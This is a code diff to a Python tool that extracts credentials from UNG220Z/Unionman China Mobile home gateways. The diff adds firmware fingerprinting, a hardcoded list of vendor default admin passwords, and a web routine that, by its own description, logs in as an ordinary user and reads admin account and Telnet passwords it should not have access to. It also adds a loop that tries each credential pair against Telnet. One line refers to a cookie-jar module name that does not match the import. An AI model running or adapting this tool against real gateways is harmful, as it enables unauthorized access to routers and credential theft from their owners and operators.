@@ -16,6 +16,8 @@ ung220z.py —— UNG220Z / Unionman 中国移动网关 凭据提取工具
 """
 import argparse
 import getpass
+import html as html_mod
+import http.cookiejar
 import os
 import re
 import select
@@ -137,9 +139,17 @@ def enable_telnet(ip, user, pw, open_browser=True):
             log("HTTP", "已发送给浏览器%s: %s" % ("" if opened else "（无可用浏览器，改由脚本直连）", raw))
         except Exception as e:
             log("WARN", "浏览器调用失败: %s" % e)
+    missing = False
     for url in variants:
         try:
             body = http_get(url)
+        except urllib.error.HTTPError as e:
+            if e.code == 404:
+                missing = True
+                log("WARN", "telnet.gch 请求失败: HTTP 404（该固件没有这个接口）")
+            else:
+                log("WARN", "telnet.gch 请求失败: HTTP %d" % e.code)
+            continue
         except Exception as e:
             log("WARN", "telnet.gch 请求失败: %s" % e)
             continue
@@ -148,7 +158,32 @@ def enable_telnet(ip, user, pw, open_browser=True):
             return True
         txt = re.sub(r"<[^>]+>", " ", body).strip()
         log("HTTP", "telnet.gch → %s" % (txt[:60] if txt else "空响应"))
+    if missing:
+        log("HINT", "404 说明这不是九联/吉比特的 .gch 固件，本脚本的开启方式不适用")
     return False
+
+
+def fingerprint(ip):
+    """打印设备指纹，便于判断固件家族。"""
+    try:
+        req = urllib.request.Request("http://%s/" % ip,
+                                     headers={"User-Agent": "Mozilla/5.0 Chrome/120"})
+        with urllib.request.urlopen(req, timeout=6) as r:
+            server = r.headers.get("Server", "-")
+            body = r.read().decode("utf-8", "replace")
+        title = re.search(r"<title>([^<]*)</title>", body, re.I)
+        hint = []
+        low = body.lower()
+        if "getpage.gch" in low or "frm_logintoken" in low:
+            hint.append("中兴 .gch 系")
+        if "ssmp" in low:
+            hint.append("华为 ssmp 系")
+        log("DATA", "指纹 Server=%s  title=%s  %s"
+            % (server, title.group(1) if title else "-", " / ".join(hint) or "未识别"))
+        return " / ".join(hint)
+    except Exception as e:
+        log("WARN", "指纹获取失败: %s" % e)
+        return ""
 
 
 # ─────────────────────────────── Telnet ───────────────────────────────
@@ -288,6 +323,124 @@ def crack_root(hashed, candidates):
     return None
 
 
+
+# ─────────────────── Web 侧侦察（读 Telnet 口令） ───────────────────
+DEFAULT_CREDS = [
+    ("CMCCAdmin", "aDm8H%MdA"),
+    ("CMCCAdmin", "UM@Pon521"),
+    ("telecomadmin", "nE7jA%5m"),
+    ("root", "adminHW"),
+    ("root", "Zte521"),
+    ("admin", "admin"),
+]
+
+
+def js_unescape(v):
+    v = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), v)
+    return html_mod.unescape(v)
+
+
+def parse_values(body):
+    return {k: js_unescape(v)
+            for k, v in re.findall(r"Transfer_meaning\('([A-Za-z_0-9]+)','((?:[^'\\]|\\.)*)'\)", body)
+            if v and not k.startswith("IF_")}
+
+
+class WebSession:
+    """带 Cookie 的 Web 会话，处理 Frm_Logintoken 递增。"""
+
+    def __init__(self, ip):
+        self.base = "http://%s/" % ip
+        self.cj = http_cookiejar.CookieJar()
+        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))
+        self.op.addheaders = [("User-Agent", "Mozilla/5.0 Chrome/120"), ("Referer", self.base)]
+
+    def get(self, path):
+        with self.op.open(self.base + path, timeout=8) as r:
+            return r.read().decode("utf-8", "replace")
+
+    def post_form(self, path, data):
+        body = urllib.parse.urlencode(data).encode()
+        with self.op.open(urllib.request.Request(self.base + path, data=body), timeout=8) as r:
+            return r.read().decode("utf-8", "replace")
+
+    def login(self, user, pw):
+        page = self.get("")
+        m = re.search(r'Frm_Logintoken"\)\.value\s*=\s*"(\d+)"', page)
+        token = m.group(1) if m else "7"
+        body = self.post_form("", {
+            "username": user,
+            "logincode": base64.b64encode(pw.encode()).decode(),
+            "textpwd": "", "frashnum": "", "ieversion": "1",
+            "Frm_Logintoken": token, "action": "login",
+        })
+        return 'name="logincode"' not in body and len(body) > 5000
+
+    def page(self, name):
+        body = self.get("getpage.gch?pid=1002&nextpage=" + name)
+        return "" if "页面超时" in body else body
+
+
+def web_recon(ip, user, pw):
+    """用普通账号登录 Web，越权读管理员行并取 telnet 口令。"""
+    out = []
+    log("INFO", "Web 侧侦察：账号表 + Telnet 配置")
+    try:
+        s = WebSession(ip)
+        if not s.login(user, pw):
+            log("WARN", "Web 侦察跳过：登录失败")
+            return out
+
+        found = {}
+        bodies = [s.page("manager_aduser_conf_t.gch")] + \
+                 [s.page("manager_aduser_conf_t.gch&IF_INDEX=%d" % i) for i in range(4)]
+        for idx, body in enumerate(bodies):
+            vals = parse_values(body)
+            u = vals.get("Username")
+            if not u:
+                continue
+            p = vals.get("InitialPassword") or vals.get("Password")
+            log("DATA", "账号[%d] %-12s %-16s Right=%s" % (idx, u, p, vals.get("Right")))
+            if p and p != "******":
+                found[u] = p
+
+        for u, p in found.items():
+            try:
+                if u != user and not s.login(u, p):
+                    continue
+                vals = parse_values(s.page("tele_sec_tserver_t.gch"))
+                tu, tp = vals.get("TS_UName"), vals.get("TS_UPwd")
+                if tp:
+                    log("DATA", "Telnet 配置 %s / %s" % (tu or u, tp))
+                    out.append((tu or u, tp))
+            except Exception as e:
+                log("WARN", "读 Telnet 配置失败: %s" % e)
+    except Exception as e:
+        log("WARN", "Web 侦察异常: %s" % e)
+    return out
+
+
+def telnet_any(ip, pairs):
+    """按 (账号, 口令) 顺序尝试，命中即返回会话。"""
+    tried = set()
+    for u, p in pairs:
+        if not u or not p or (u, p) in tried:
+            continue
+        tried.add((u, p))
+        try:
+            tn = Telnet(ip)
+        except Exception as e:
+            log("WARN", "Telnet 连接失败: %s" % e)
+            return None
+        if tn.login(u, [p]):
+            log("AUTH", "Telnet %s / %s → 登录成功" % (u, p))
+            return tn
+        log("AUTH", "Telnet %s / %s → 拒绝" % (u, p))
+        tn.close()
+        time.sleep(0.3)
+    return None
+
+
 # ─────────────────────────────── 主流程 ───────────────────────────────
 def main():
     global _logfh
@@ -340,20 +493,39 @@ def main():
         log("INFO", "释放残留 Web 会话 → %s" % ("ok" if release_session(ip) else "skip"))
 
     log("INFO", "补全 URL: http://%s/usr=%s&psw=***&cmd=1&telnet.gch" % (ip, user))
-    enable_telnet(ip, user, pw, open_browser=not a.no_browser)
+    opened = enable_telnet(ip, user, pw, open_browser=not a.no_browser)
 
     log("PROBE", "nc -zv %s 23 → %s" % (ip, "succeeded" if probe_port(ip, 23) else "timed out"))
     if not probe_port(ip, 23):
-        log("WARN", "23 端口未开放（密码可能已轮换，重跑脚本）")
+        log("WARN", "23 端口未开放，无法继续")
+        if not opened:
+            log("INFO", "开始识别固件类型 …")
+            fam = fingerprint(ip)
+            if "华为" in fam:
+                log("HINT", "这是华为 ssmp 固件：用 python3 -m ontkit huawei -H %s" % ip)
+            elif "中兴" in fam:
+                log("HINT", "这是中兴 .gch 固件：用 python3 -m ontkit zte -H %s -p 8080 --mode factory" % ip)
+            else:
+                log("HINT", "试试：python3 -m ontkit probe -H %s" % ip)
+            log("HINT", "该固件可能没有 telnet.gch 接口，本脚本的开启方式不适用")
+        else:
+            log("HINT", "telnet.gch 已返回 Success 但 23 未监听：确认设备没禁用 Telnet 服务")
         return 3
 
-    tn = Telnet(ip)
-    cands = [x for x in (TELNET_PW, getattr(a, "telnet_password", None)) if x]
-    if pw not in cands:
-        cands.append(pw)
-    if not tn.login(a.telnet_user, cands):
-        log("WARN", "Telnet 登录失败，终止")
-        tn.close()
+    # ── Telnet 登录：多账号多口令，逐级升级 ──
+    pairs = [(user, pw)]                                  # ① 你填的账号本人
+    if a.telnet_user and a.telnet_user != user:
+        pairs.append((a.telnet_user, pw))                 # ② CMCCAdmin + 同一口令
+    if getattr(a, "telnet_password", None):
+        pairs.append((a.telnet_user, a.telnet_password))  # ③ 命令行指定
+    pairs += web_recon(ip, user, pw)                      # ④ Web 侧侦察（越权读账号 + Telnet 配置页）
+    pairs += DEFAULT_CREDS                                # ⑤ 出厂默认组合
+
+    tn = telnet_any(ip, pairs)
+    if not tn:
+        log("WARN", "Telnet 登录失败：所有候选账号/口令均被拒绝")
+        log("HINT", "浏览器用超管登录后打开下面这个地址可看到 Telnet 口令：")
+        log("HINT", "  http://%s/getpage.gch?pid=1002&nextpage=tele_sec_tserver_t.gch" % ip)
         return 4
 
     if a.unlock or web_state(ip) == "busy":
